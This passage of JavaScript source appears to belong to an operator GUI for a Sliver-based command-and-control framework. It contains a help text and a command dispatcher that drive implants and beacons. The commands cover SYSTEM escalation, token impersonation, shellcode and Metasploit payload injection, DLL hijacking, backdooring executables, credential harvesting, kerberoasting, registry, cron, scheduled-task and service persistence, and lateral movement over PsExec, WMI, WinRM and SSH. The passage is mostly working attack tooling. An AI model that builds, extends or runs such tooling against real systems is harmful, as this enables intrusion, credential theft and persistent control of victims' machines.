  loot [add <file>|rm <id>]  Save a target file to the shared loot store / list

  chmod <path> <mode>        Change file mode (e.g. 0755)
  chown <path> <uid> <gid>   Change file owner

Privilege / execution (session only):
  getsystem <profile> [proc] Escalate to SYSTEM via an implant profile
  make-token <dom> <u> <p>   Create a token from credentials
  impersonate <user>         Impersonate a logged-on user
  rev2self                   Drop an impersonated token
  runas -u <u> [-p <p>] <prog> [args]   Run a program as another user
  migrate <pid> <profile>    Migrate the implant into another process
  execute-assembly <local.exe> [args]   Run a .NET assembly (path or dialog)
  execute-shellcode <local.bin> [pid]   Inject shellcode (path or dialog)
  sideload <local.dll> [args]           Sideload a DLL/.so (path or dialog)
  spawndll <local.dll> [args]           Reflectively load a DLL (path or dialog)
  extensions                            List installed + loaded extensions/BOFs
  ext <command> [args...]               Run an extension/BOF (e.g. ext sa-whoami)
  wasm [list|register <f> [name]|exec <name> [args]]   WASM extensions
  execute-windows [-t][-H][--ppid <pid>] <path> [args]  Execute w/ token/PPID spoof (Windows)
  ping                                  Round-trip liveness check (session)
  wg-forwarders / wg-list-socks         List active WireGuard forwarders / socks
  close                                 Gracefully close this session
  backdoor <remote_pe> <profile>        Backdoor an on-disk PE with an implant
  dllhijack <ref_dll> <target> <profile>  Plant a hijacking DLL
  msf <payload> <lhost> <lport>         Run a Metasploit payload in-process
  msf-inject <payload> <lhost> <lport> <pid>  Inject an msf payload into a PID

Pivoting / tunneling (session only):
  socks start <port>|stop|status
  portfwd add <lport> <rhost> <rport> | rm <lport> | list
  rportfwd add <bindport> <fwdhost> <fwdport> | rm <id> | list
  wg-portfwd add <lport> <rhost:port> | rm <id>   (WireGuard implants)
  wg-socks <port> | stop <id>                      (WireGuard implants)
  pivot  start tcp|pipe <bind> | stop <id> | list
  services [detail <name>|start <name>]   Windows services (list / inspect / start)

Beacon only:
  tasks                      Show the beacon task queue
  reconfig <interval> <jitter>   Change the beacon check-in interval (seconds)
  interactive                Open an interactive session from this beacon
  (all commands are queued and run on next check-in)

Scripts (session & beacon - auto-generate + deploy):
  spawn <os> <arch> <profile>                             Spawn new beacon on CURRENT host (no creds needed)
                                                          e.g. spawn windows x64 my-http-profile
                                                          e.g. spawn linux x64 my-mtls-profile
  spawn linux <user>@<host> [-p <pass>] <profile>         Generate + deploy to remote via SSH
  spawn windows <user>@<host> [-p <pass>] <profile>       Generate + deploy to remote via PsExec
  jump ssh <user>@<host> [-p <pass>] <profile>            Alias for remote spawn linux
  jump psexec <user>@<host> [-p <pass>] <profile>         Alias for remote spawn windows
  jump winrm <user>@<host> [-p <pass>] <cmd>              Execute via WinRM
  jump wmi <user>@<host> [-p <pass>] <cmd>                Execute via WMI
  privesc-check                  Enumerate privilege escalation vectors
  harvest                        Search for credentials, keys, tokens
  ad-enum                        Enumerate Active Directory (domain info, admins, SPNs)
  local-enum                     Local system enumeration (whoami, admins, AV, network)
  kerberoast                     Request TGS tickets for offline cracking
  persist cron <line>            Add cron persistence
  persist reg <name> <path>      Add registry Run key persistence
  persist schtask <name> <path>  Add scheduled task persistence
  persist service <name> <path>  Install as Windows service
  scan <subnet> [ports]          Port scan from implant (e.g. scan 192.168.50 22,445,3306)

  NOTE: Create profiles first in Profiles panel or Server console:
    profiles new --mtls 10.10.10.1:8443 --os windows --arch amd64 --beacon --name win-mtls
    profiles new --http 10.10.10.1:8080 --os linux --arch amd64 --beacon --name lin-http
`.trim();

// Split a command line into tokens, respecting single/double quotes so a quoted
// argument (e.g. execute cmd.exe /c "net user X /add && ...") stays one token.
function tok(s) {
  const out = [], re = /"([^"]*)"|'([^']*)'|(\S+)/g; let m;
  while ((m = re.exec(s)) !== null) out.push(m[1] !== undefined ? m[1] : (m[2] !== undefined ? m[2] : m[3]));
  return out;
}

async function runAgentCmd(kind, id, inp, hist) {
  let raw = inp.value.trim(); if (!raw) return;
  // features-bundle.js may install an alias expander on window; apply it so
  // an operator can type `enum` and have it become `execute-assembly …`.
  if (typeof window.expandAlias === 'function') raw = window.expandAlias(raw);
  hist.unshift(raw); inp.value = '';
  appendOut(id, raw, 'cmd');
  inp.disabled = true;
  try {
    await dispatchCmd(kind, id, raw);
  } catch (e) {
    appendOut(id, `[error] ${e}`, 'err');
  } finally {
    inp.disabled = false; inp.focus();
  }
}

async function dispatchCmd(kind, id, raw) {
  const parts = tok(raw);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);
  const tab = openTabs[id] || {};

  // ── universal built-ins ──
  if (cmd === 'help') return appendOut(id, HELP_TEXT, 'info');
  if (cmd === 'clear') { const o = document.getElementById(`cout-${id}`); if (o) o.innerHTML = ''; return; }
  if (cmd === 'info') { const o = tab.obj; return appendOut(id, `ID: ${o.id}\nHost: ${o.hostname}\nUser: ${o.username}\nOS: ${o.os}/${o.arch}\nPID: ${o.pid}\nTransport: ${o.transport}\nRemote: ${o.remoteAddress}`, 'info'); }
  if (cmd === 'tasks' && kind === 'beacon') return showTasks(id);
  if ((cmd === 'shell' && (!args.length || args[0] === '-i')) || cmd === 'pty') {
    if (kind !== 'session') return appendOut(id, '[!] interactive shell requires a session (beacons are async). For a beacon use: shell <command>', 'err');
    return openInteractiveShell(id, tab.obj);
  }

  // ── beacons: queue command, then poll for the result (non-blocking) ──
  if (kind === 'beacon') {
    const _bcn = allBeacons.find(b => b.id === id);
    if (_bcn && _bcn.isDead) {
      return appendOut(id, '[!] beacon is DEAD (no recent check-ins). Re-deploy the implant to resume.', 'err');
    }
    if (_bcn && _bcn.lastCheckinTs > 0) {
      const ageSec = Math.floor(Date.now() / 1000) - _bcn.lastCheckinTs;
      const intSec = (_bcn.interval || 5000000000) / 1e9;
      if (ageSec > intSec * 5) {
        appendOut(id, `[!] beacon last checked in ${ageSec}s ago (interval ${intSec}s) - it may be dead. Command queued anyway.`, 'warn');
      }
    }
    if (cmd === 'reconfig') {
      if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
      await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
      return appendOut(id, `[+] reconfigure queued - interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
    }
    if (cmd === 'interactive') {
      await App().InteractiveBeacon(id);
      return appendOut(id, '[+] interactive session requested - it will appear as a session on next check-in', 'ok');
    }
    // Native gRPC commands bypass cmd.exe shell wrapper (critical for hollowed processes)
    const _nativeCmds = new Set(['whoami','ps','pwd','cd','ls','netstat','env','ifconfig','screenshot','kill','terminate','rev2self','make-token','impersonate','mkdir']);
    let r;
    if (_nativeCmds.has(cmd)) {
      r = await App().BeaconNativeCommand(id, cmd, args.join(' ')).catch(e => ({ error: String(e) }));
    } else if (cmd === 'shell') {
      r = await App().ExecuteBeaconCommandAsync(id, args.join(' ')).catch(e => ({ error: String(e) }));
    } else {
      r = await App().ExecuteBeaconCommandAsync(id, raw).catch(e => ({ error: String(e) }));
    }
    if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
    if (r.status === 'completed') {
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    if (r.taskId) {
      pendingBeaconTasks[r.taskId] = { beaconId: id, cmdType: r.cmdType || '' };
      appendOut(id, `[*] task ${r.taskId.slice(0,8)} queued (${r.cmdType || 'shell'}) - waiting for beacon check-in...`, 'pending');
      pollBeaconResult(id, r.taskId);
    } else {
      appendOut(id, '[*] command queued - polling for result...', 'pending');
      pollBeaconLatest(id);
    }
    return;
  }

  // ── session commands ──
  switch (cmd) {
    case 'ps': {
      const procs = await App().GetProcessList(id);
      let out = 'PID     PPID    OWNER                EXECUTABLE\n';
      procs.forEach(p => { out += `${String(p.pid).padEnd(8)}${String(p.ppid).padEnd(8)}${(p.owner||'').slice(0,20).padEnd(21)}${p.executable||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'pwd': { const p = await App().PrintWorkingDir(id); tab.cwd = p; return appendOut(id, p, 'out'); }
    case 'cd': {
      if (!args[0]) return appendOut(id, 'usage: cd <path>', 'err');
      const p = await App().ChangeDir(id, args.join(' '));
      tab.cwd = p;
      return appendOut(id, p, 'out');
    }
    case 'ls': {
      const path = args[0] || tab.cwd || '.';
      const r = await App().ListFiles(id, path);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      tab.cwd = r.path || path;
      let out = `${tab.cwd}\n`;
      (r.files||[]).forEach(f => { out += `${f.isDir?'d':'-'} ${(f.mode||'').padEnd(11)} ${String(f.isDir?'':fmtSize(f.size)).padStart(9)}  ${f.name}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'download': {
      if (!args[0]) return appendOut(id, 'usage: download <remote> [local]   (no local path → save dialog)', 'err');
      // Two args = CLI style download to a specific local path; one arg = save dialog.
      const r = args.length >= 2
        ? await App().DownloadFileTo(id, args[0], args[1])
        : await App().DownloadFile(id, args[0]);
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] ${args[0]} -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'upload': {
      // upload <local> <remote> (CLI) | upload [remote] (open dialog for local)
      const r = args.length >= 2
        ? await App().UploadFileFrom(id, args[0], args[1])
        : await App().UploadFile(id, args[0] || '');
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] uploaded -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'screenshot': {
      appendOut(id, '[*] capturing...', 'pending');
      const dataUrl = await App().TakeScreenshot(id).catch(e => null);
      if (!dataUrl) return appendOut(id, '[error] screenshot failed', 'err');
      return appendImg(id, dataUrl);
    }
    case 'netstat': {
      const entries = await App().GetNetstat(id);
      let out = 'PROTO  LOCAL                 REMOTE                STATE        PID    PROCESS\n';
      entries.forEach(e => { out += `${(e.protocol||'').padEnd(7)}${(e.localAddr||'').padEnd(22)}${(e.remoteAddr||'').padEnd(22)}${(e.state||'').padEnd(13)}${String(e.pid||'').padEnd(7)}${e.process||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'env': {
      const vars = await App().GetEnvVars(id);
      return appendOut(id, vars.map(v => `${v.key}=${v.value}`).join('\n'), 'out');
    }
    case 'whoami': {
      const owner = await App().CurrentTokenOwner(id).catch(() => null);
      if (owner) return appendOut(id, owner, 'out');
      return dispatchCmd(kind, id, 'shell whoami');
    }
    case 'kill': case 'terminate': {
      if (!args[0]) return appendOut(id, `usage: ${cmd} <pid>`, 'err');
      await App().KillRemoteProcess(id, parseInt(args[0]));
      return appendOut(id, `[+] terminated PID ${args[0]}`, 'out');
    }
    case 'getsystem': {
      if (!args[0]) return appendOut(id, 'usage: getsystem <profile> [hosting_process]', 'err');
      const err = await App().GetSystem(id, args[1] || '', args[0]).then(() => null).catch(e => String(e));
      if (err) {
        if (err.includes('main.go') || err.includes('parse') || err.includes('IDENT')) {
          return appendOut(id, `[error] the teamserver failed to generate the shellcode implant for getsystem (server-side codegen error, not the GUI). This is a known Sliver server issue with shellcode/inject generation. Workaround: use the service-persistence method (sc create + a generated exe) to get SYSTEM, which you've already done successfully.`, 'err');
        }
        return appendOut(id, `[error] ${err}`, 'err');
      }
      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it - watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) - that returns a SYSTEM session directly.', 'info');
    }
    case 'make-token': {
      if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
      await App().MakeToken(id, args[1], args[0], args.slice(2).join(' '));
      return appendOut(id, '[+] token created', 'out');
    }
    case 'impersonate': {
      if (!args[0]) return appendOut(id, 'usage: impersonate <user>', 'err');
      await App().ImpersonateUser(id, args.join(' '));
      return appendOut(id, `[+] impersonating ${args.join(' ')}`, 'out');
    }
    case 'rev2self': { await App().RevToSelf(id); return appendOut(id, '[+] reverted to self', 'out'); }
    case 'execute-assembly': {
      // execute-assembly <local-path> [assembly args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
      const r = await App().ExecuteAssembly(id, args[0] || '', args.slice(1).join(' '));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.output && r.output.trim()) return appendOut(id, r.output.trimEnd(), 'out');
      return appendOut(id, '[+] executed, but NO output was captured.\n    execute-assembly runs .NET/CLR assemblies ONLY. If this is a native binary\n    (e.g. mimikatz.exe), use: upload it then `execute`, or `sideload` the mimikatz DLL.', 'info');
    }
    case 'sideload': {
      // sideload <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
      const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
    }
    case 'socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'start') { await App().StartSocksProxy(id, parseInt(args[1])||1080); return appendOut(id, `[+] SOCKS5 on 127.0.0.1:${parseInt(args[1])||1080}`, 'out'); }
      if (sub === 'stop')  { await App().StopSocksProxy(id); return appendOut(id, '[+] SOCKS5 stopped', 'out'); }
      const p = await App().SocksProxyStatus(id);
      return appendOut(id, p ? `[*] SOCKS5 active on 127.0.0.1:${p}` : '[*] no SOCKS5 proxy running', 'info');
    }
    case 'portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().AddPortForward(id, parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] 127.0.0.1:${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm')  { await App().RemovePortForward(id, parseInt(args[1])); return appendOut(id, `[+] removed forward on :${args[1]}`, 'out'); }
      const fwds = await App().ListPortForwards(id);
      return appendOut(id, fwds.length ? fwds.map(f => `127.0.0.1:${f.localPort} -> ${f.remote}`).join('\n') : '[*] no port forwards', 'info');
    }
    case 'pivot': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'start') { await App().StartPivotListener(id, args[1]||'tcp', args[2]||'0.0.0.0:9898'); return appendOut(id, `[+] pivot listener started (${args[1]||'tcp'} ${args[2]||'0.0.0.0:9898'})`, 'out'); }
      if (sub === 'stop')  { await App().StopPivotListener(id, parseInt(args[1])); return appendOut(id, `[+] pivot ${args[1]} stopped`, 'out'); }
      const pv = await App().ListPivots(id);
      return appendOut(id, pv.length ? pv.map(p => `#${p.id} ${p.type} ${p.bindAddress}`).join('\n') : '[*] no pivot listeners', 'info');
    }
    case 'services': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'detail' || sub === 'info') {
        if (!args[1]) return appendOut(id, 'usage: services detail <name>', 'err');
        const d = await App().ServiceDetail(id, '', args[1]);
        return appendOut(id, `Name:        ${d.name}\nDisplay:     ${d.displayName}\nStatus:      ${d.status}\nStartup:     ${d.startupType}\nAccount:     ${d.account}\nBinPath:     ${d.binPath}\nDescription: ${d.description}`, 'out');
      }
      if (sub === 'start') {
        if (!args[1]) return appendOut(id, 'usage: services start <name>', 'err');
        await App().StartServiceByName(id, '', args[1]);
        return appendOut(id, `[+] service ${args[1]} start requested`, 'out');
      }
      const svcs = await App().ListServices(id);
      let out = 'STATUS      NAME                           DISPLAY\n';
      svcs.forEach(s => { out += `${(s.status||'').padEnd(12)}${(s.name||'').slice(0,30).padEnd(31)}${s.displayName||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'grep': {
      if (args.length < 2) return appendOut(id, 'usage: grep [-r] <pattern> <path>', 'err');
      const recursive = args[0] === '-r';
      const a2 = recursive ? args.slice(1) : args;
      const pattern = a2[0], path = a2.slice(1).join(' ');
      const res = await App().GrepFiles(id, pattern, path, recursive);
      return appendOut(id, res, 'out');
    }
    case 'mount': {
      const mounts = await App().ListMounts(id);
      if (!mounts.length) return appendOut(id, '[*] no mounts', 'info');
      let out = 'MOUNT           FS         TYPE       LABEL           FREE/TOTAL\n';
      const gb = n => (n/1073741824).toFixed(1)+'G';
      mounts.forEach(m => { out += `${(m.mountPoint||'').slice(0,14).padEnd(16)}${(m.fileSystem||'').padEnd(11)}${(m.type||'').padEnd(11)}${(m.label||'').slice(0,14).padEnd(16)}${m.totalSpace?`${gb(m.freeSpace)}/${gb(m.totalSpace)}`:''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'memfiles': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'add') { const fd = await App().MemfilesAdd(id); return appendOut(id, `[+] created memfile fd=${fd}`, 'out'); }
      if (sub === 'rm')  { if (!args[1]) return appendOut(id, 'usage: memfiles rm <fd>', 'err'); await App().MemfilesRm(id, parseInt(args[1])); return appendOut(id, `[+] removed fd=${args[1]}`, 'out'); }
      const res = await App().MemfilesList(id);
      return appendOut(id, res, 'out');
    }
    case 'ssh': {
      if (args.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>  (prompts nothing; add password with -p <pass>)', 'err');
      let pass = '';
      const pi = args.indexOf('-p');
      if (pi >= 0) { pass = args[pi+1]||''; args.splice(pi, 2); }
      const target = args[0]; const cmd = args.slice(1).join(' ');
      const at = target.split('@'); if (at.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>', 'err');
      const user = at[0]; const hp = at[1].split(':'); const host = hp[0]; const port = parseInt(hp[1]||'22');
      const r = await App().SSHExec(id, host, port, user, pass, cmd);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wasm': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'register') { if (!args[1]) return appendOut(id, 'usage: wasm register <local.wasm> [name]', 'err'); await App().RegisterWasmExtension(id, args[2]||'', args[1]); return appendOut(id, `[+] registered WASM extension`, 'out'); }
      if (sub === 'exec') { if (!args[1]) return appendOut(id, 'usage: wasm exec <name> [args...]', 'err'); const r = await App().ExecWasmExtension(id, args[1], args.slice(2)); if (r.error) return appendOut(id, `[error] ${r.error}`, 'err'); if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out'); if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err'); return; }
      const names = await App().ListWasmExtensions(id);
      return appendOut(id, names.length ? names.join('\n') : '[*] no WASM extensions registered', names.length?'out':'info');
    }
    case 'ping': {
      const t0 = Date.now();
      try { await App().PingSession(id); return appendOut(id, `[+] pong (${Date.now()-t0}ms)`, 'out'); }
      catch (e) { return appendOut(id, `[error] ${e}`, 'err'); }
    }
    case 'execute-windows': case 'execw': {
      const useToken = args.includes('-t'), hide = args.includes('-H');
      let ppid = 0; const pi = args.indexOf('--ppid'); if (pi >= 0) { ppid = parseInt(args[pi+1])||0; }
      const rest = args.filter((a,idx) => !a.startsWith('-') && !(pi>=0 && idx===pi+1));
      if (!rest.length) return appendOut(id, 'usage: execute-windows [-t] [-H] [--ppid <pid>] <path> [args...]', 'err');
      const r = await App().ExecuteWindowsAdvanced(id, rest[0], rest.slice(1), useToken, hide, ppid);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wg-forwarders': {
      const f = await App().ListWGForwarders(id);
      return appendOut(id, f.length ? f.map(x => `#${x.id} ${x.localAddr} -> ${x.remoteAddr}`).join('\n') : '[*] no WG forwarders', f.length?'out':'info');
    }
    case 'wg-list-socks': {
      const s = await App().ListWGSocks(id);
      return appendOut(id, s.length ? s.map(x => `#${x.id} ${x.localAddr}`).join('\n') : '[*] no WG socks servers', s.length?'out':'info');
    }
    case 'close': {
      if (kind !== 'session') return appendOut(id, '[!] close applies to sessions (use kill-beacon for beacons)', 'err');
      await App().CloseSessionGraceful(id);
      return appendOut(id, '[+] session close requested (graceful)', 'out');
    }
    case 'mkdir': {
      if (!args[0]) return appendOut(id, 'usage: mkdir <path>', 'err');
      await App().MakeDirectory(id, args[0]);
      return appendOut(id, `[+] created ${args[0]}`, 'out');
    }
    case 'rm': case 'rmdir': {
      if (!args[0]) return appendOut(id, 'usage: rm <path>', 'err');
      await App().RemoveFile(id, args[0]);
      return appendOut(id, `[+] removed ${args[0]}`, 'out');
    }
    case 'setenv': {
      if (args.length < 2) return appendOut(id, 'usage: setenv <KEY> <VALUE>', 'err');
      await App().SetEnvVar(id, args[0], args.slice(1).join(' '));
      return appendOut(id, `[+] ${args[0]} set`, 'out');
    }
    case 'unsetenv': {
      if (!args[0]) return appendOut(id, 'usage: unsetenv <KEY>', 'err');
      await App().UnsetEnvVar(id, args[0]);
      return appendOut(id, `[+] ${args[0]} unset`, 'out');
    }
    case 'getenv': {
      const vars = await App().GetEnvVars(id);
      const filtered = args[0] ? vars.filter(v => v.key.toLowerCase().includes(args[0].toLowerCase())) : vars;
      return appendOut(id, filtered.map(v => `${v.key}=${v.value}`).join('\n') || '[*] no match', 'out');
    }
    case 'reg': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'query') {
        if (!args[1]) return appendOut(id, 'usage: reg query <HIVE> <path>  (HIVE: HKLM HKCU HKCR HKU HKCC)', 'err');
        const vals = await App().RegistryListValues(id, args[1], args.slice(2).join(' '));
        let out = 'NAME                 TYPE        VALUE\n';
        vals.forEach(v => { out += `${(v.name||'(default)').slice(0,20).padEnd(21)}${(v.type||'').padEnd(12)}${v.value||''}\n`; });
        return appendOut(id, out.trimEnd(), 'out');
      }
      if (sub === 'read') { const v = await App().RegistryReadValue(id, args[1], args[2], args[3]); return appendOut(id, v, 'out'); }
      if (sub === 'write') { await App().RegistryWriteValue(id, args[1], args[2], args[3], args.slice(4).join(' ')); return appendOut(id, '[+] value written', 'out'); }
      if (sub === 'read-hive') {
        if (!args[1]) return appendOut(id, 'usage: reg read-hive <ROOT_HIVE> [requested_hive]', 'err');
        const p = await App().RegistryReadHiveExport(id, args[1], args[2]||'');
        return appendOut(id, `[+] hive saved to ${p}`, 'out');
      }
      if (sub === 'listkeys' || sub === 'list-keys' || sub === 'subkeys') {
        if (!args[1]) return appendOut(id, 'usage: reg listkeys <HIVE> <path>', 'err');
        const keys = await App().RegistryListSubKeys(id, args[1], args.slice(2).join(' '));
        return appendOut(id, (keys || []).join('\n') || '[*] no subkeys', 'out');
      }
      if (sub === 'createkey' || sub === 'create-key' || sub === 'mkkey') {
        if (!args[3]) return appendOut(id, 'usage: reg createkey <HIVE> <path> <key>', 'err');
        await App().RegistryCreateKey(id, args[1], args[2], args[3]);
        return appendOut(id, `[+] created key: ${args[3]}`, 'out');
      }
      if (sub === 'deletekey' || sub === 'delete-key' || sub === 'rmkey') {
        if (!args[3]) return appendOut(id, 'usage: reg deletekey <HIVE> <path> <key>', 'err');
        await App().RegistryDeleteKey(id, args[1], args[2], args[3]);
        return appendOut(id, `[+] deleted key: ${args[3]}`, 'out');
      }
      return appendOut(id, 'usage: reg query|read|write|read-hive|listkeys|createkey|deletekey <HIVE> <path> [key] [value]', 'err');
    }
    case 'svc':
    case 'service': {
      const sub = (args[0]||'').toLowerCase();
      if (!sub || sub === 'ls' || sub === 'list') {
        const list = await App().ListServices(id).catch(e => { appendOut(id, String(e), 'err'); return null; });
        if (!list) return;
        let out = 'STATUS      START-TYPE  NAME\n';
        list.forEach(s => { out += `${(s.status||'').padEnd(12)}${(s.startupMode||'').padEnd(12)}${s.name}\n`; });
        return appendOut(id, out.trimEnd() || '[*] no services', 'out');
      }
      if (sub === 'info' || sub === 'detail') {
        if (!args[1]) return appendOut(id, 'usage: svc info <name> [hostname]', 'err');
        const v = await App().ServiceDetail(id, args[2] || '', args[1]).catch(e => { appendOut(id, String(e), 'err'); return null; });
        if (!v) return;
        return appendOut(id, JSON.stringify(v, null, 2), 'out');
      }
      if (sub === 'start') {
        if (!args[1]) return appendOut(id, 'usage: svc start <name> [hostname]', 'err');
        await App().StartServiceByName(id, args[2] || '', args[1]);
        return appendOut(id, `[+] start requested: ${args[1]}`, 'out');
      }
      if (sub === 'stop') {
        if (!args[1]) return appendOut(id, 'usage: svc stop <name> [hostname]', 'err');
        await App().StopService(id, args[2] || '', args[1]);
        return appendOut(id, `[+] stop requested: ${args[1]}`, 'out');
      }
      if (sub === 'create' || sub === 'install') {
        if (!args[2]) return appendOut(id, 'usage: svc create <name> <binPath> [hostname]', 'err');
        await App().StartService(id, args[3] || '', args[1], args[2]);
        return appendOut(id, `[+] service '${args[1]}' created`, 'out');
      }
      if (sub === 'remove' || sub === 'delete' || sub === 'rm') {
        if (!args[1]) return appendOut(id, 'usage: svc remove <name> [hostname]', 'err');
        await App().RemoveService(id, args[2] || '', args[1]);
        return appendOut(id, `[+] service '${args[1]}' removed`, 'out');
      }
      return appendOut(id, 'usage: svc list|info|start|stop|create|remove <name> [hostname]', 'err');
    }
    case 'execute': {
      // execute [-o|-e|-t|-s ...] <path> [args] - run a program directly (no shell)
      const rest = args.filter(a => !a.startsWith('-'));
      if (!rest.length) return appendOut(id, 'usage: execute [-o] <path> [args...]', 'err');
      const r = await App().RunExecute(id, rest[0], rest.slice(1));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
    case 'cat': {
      if (!args[0]) return appendOut(id, 'usage: cat <remote_path>', 'err');
      const txt = await App().ReadRemoteFile(id, args.join(' '));
      return appendOut(id, txt || '(empty file)', 'out');
    }
    case 'mv': {
      if (args.length < 2) return appendOut(id, 'usage: mv <src> <dst>', 'err');
      await App().MoveFile(id, args[0], args[1]);
      return appendOut(id, `[+] ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'cp': {
      if (args.length < 2) return appendOut(id, 'usage: cp <src> <dst>', 'err');
      const n = await App().CopyFile(id, args[0], args[1]);
      return appendOut(id, `[+] copied ${fmtSize(n)} ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'ifconfig': case 'ipconfig': {
      const ifs = await App().Ifconfig(id);
      let out = '';
      ifs.forEach(i => { out += `${i.name}${i.mac ? '  ('+i.mac+')' : ''}\n${(i.ips||[]).map(a => '    '+a).join('\n')}\n`; });
      return appendOut(id, out.trimEnd() || '(no interfaces)', 'out');
    }
    case 'getprivs': {
      const r = await App().GetPrivs(id);
      let out = `Process: ${r.processName}   Integrity: ${r.integrity}\n\nPRIVILEGE                          ENABLED\n`;
      (r.privs||[]).forEach(p => { out += `${(p.name||'').padEnd(35)}${p.enabled ? 'yes' : 'no'}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'procdump': {
      if (!args[0]) return appendOut(id, 'usage: procdump <pid>', 'err');
      appendOut(id, '[*] dumping process memory...', 'pending');
      const r = await App().ProcessDump(id, parseInt(args[0]));
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] dumped ${fmtSize(r.bytes)} -> ${r.path}`, r.error?'err':'out');
    }
    case 'extensions': case 'ext-list': {
      const installed = await App().ListInstalledExtensions().catch(() => []);
      const loaded = await App().ListImplantExtensions(id).catch(() => []);
      let out = 'INSTALLED COMMANDS  (run with:  ext <command> [args...])\n';
      if (!installed.length) out += '  (none installed - use the Sliver CLI: armory install <name>)\n';
      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  - '+e.help):''}\n`);
      out += `\nLOADED IN THIS IMPLANT:  ${loaded && loaded.length ? loaded.join(', ') : '(none yet)'}`;
      return appendOut(id, out, 'out');
    }
    case 'ext': {
      if (!args[0]) return appendOut(id, 'usage: ext <command> [args...]   (list them with: extensions)', 'err');
      appendOut(id, `[*] running extension '${args[0]}'...`, 'pending');
      const r = await App().RunExtension(id, args[0], args.slice(1)).then(o => ({ o })).catch(e => ({ err: String(e) }));
      if (r.err) return appendOut(id, `[error] ${r.err}`, 'err');
      return appendOut(id, (r.o && r.o.trim()) ? r.o.trimEnd() : '[+] executed (no output)', 'out');
    }
    case 'backdoor': {
      if (args.length < 2) return appendOut(id, 'usage: backdoor <remote_pe_path> <profile>', 'err');
      const err = await App().Backdoor(id, args[0], args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${args[1]}`, err?'err':'out');
    }
    case 'dllhijack': {
      if (args.length < 3) return appendOut(id, 'usage: dllhijack <reference_dll> <target_location> <profile>', 'err');
      const err = await App().DllHijack(id, args[0], args[1], args[2]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] DLL hijack planted at ${args[1]}`, err?'err':'out');
    }
    case 'msf': {
      if (args.length < 3) return appendOut(id, 'usage: msf <payload> <lhost> <lport>   (e.g. windows/x64/meterpreter/reverse_tcp)', 'err');
      const err = await App().MsfInject(id, args[0], args[1], parseInt(args[2])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : '[+] msf payload staged into the implant process', err?'err':'out');
    }
    case 'msf-inject': {
      if (args.length < 4) return appendOut(id, 'usage: msf-inject <payload> <lhost> <lport> <pid>', 'err');
      const err = await App().MsfRemoteInject(id, args[0], args[1], parseInt(args[2]), parseInt(args[3])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${args[3]}`, err?'err':'out');
    }
